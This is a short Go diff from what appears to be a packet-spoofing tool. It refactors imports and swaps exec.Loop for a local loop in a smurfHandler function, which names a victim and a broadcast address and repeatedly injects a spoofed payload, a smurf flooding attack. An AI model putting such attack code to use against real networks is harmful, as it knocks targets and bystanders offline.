@@ -3,13 +3,11 @@ package app
 import (
 	"encoding/hex"
 	"fmt"
+	"github.com/adrianosela/spoof/payloads"
+	"github.com/adrianosela/spoof/wire"
 	"log"
 	"net"
 	"time"
-
-	"github.com/adrianosela/spoof/exec"
-	"github.com/adrianosela/spoof/payloads"
-	"github.com/adrianosela/spoof/wire"
 
 	"github.com/pkg/errors"
 	cli "gopkg.in/urfave/cli.v1"
@@ -109,7 +107,7 @@ func smurfHandler(ctx *cli.Context) error {
 	banner := "Victim: %s\nUsing Broadcast: %s\nEvery: %s\nPayload:\n---\n%v---\n"
 	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))
 
-	exec.Loop(every, func() {
+	loop(every, func() {
 		if err = w.Inject(payload); err != nil {
 			log.Println(err)
 		}
